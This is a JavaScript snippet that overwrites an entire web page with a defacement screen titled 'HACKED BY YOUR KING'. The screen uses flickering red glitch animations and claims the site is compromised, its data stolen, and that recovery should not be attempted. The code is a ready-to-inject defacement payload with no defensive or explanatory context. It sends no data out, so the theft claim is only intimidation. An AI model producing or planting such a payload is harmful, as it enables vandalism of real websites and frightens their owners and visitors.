document.getElementsByTagName("html")[0].innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACKED BY YOUR KING</title>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            overflow: hidden;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            animation: background-flicker 3s infinite alternate;
        }

        @keyframes background-flicker {
            0% {
                background-color: #000;
            }
            50% {
                background-color: #330000;
            }
            100% {
                background-color: #000;
            }
        }

        .container {
            position: relative;
        }

        .glitch {
            font-size: 6rem;
            position: relative;
            color: #ff0000;
            text-shadow: 0 0 5px rgba(255, 0, 0, 0.8), 0 0 10px rgba(255, 0, 0, 0.6);
            animation: glitch 1s infinite, shake 0.5s infinite;
        }

        @keyframes glitch {
            0% {
                transform: translate(0);
            }
            20% {
                transform: translate(-5px, -5px);
            }
            40% {
                transform: translate(5px, 5px);
            }
            60% {
                transform: translate(-5px, 5px);
            }
            80% {
                transform: translate(5px, -5px);
            }
            100% {
                transform: translate(0);
            }
        }

        @keyframes shake {
            0% { transform: translate(0); }
            25% { transform: translate(-2px, -2px); }
            50% { transform: translate(2px, 2px); }
            75% { transform: translate(-2px, 2px); }
            100% { transform: translate(0); }
        }

        .message {
            font-size: 2.5rem;
            color: #ffffff;
            animation: flicker 1.5s infinite alternate;
            margin: 10px 0;
        }

        @keyframes flicker {
            0% {
                opacity: 1;
            }
            50% {
                opacity: 0.3;
            }
            100% {
                opacity: 1;
            }
        }

        .warning {
            font-size: 1.5rem;
            color: #ffcc00;
            margin-top: 20px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="glitch" data-text="HACKED!">HACKED!</h1>
        <p class="message">Your website has been compromised!</p>
        <p class="message">We have your data!</p>
        <p class="message">Fear the consequences!</p>
        <p class="warning">WARNING: Do not attempt to recover!</p>
    </div>
</body>
</html>
`;
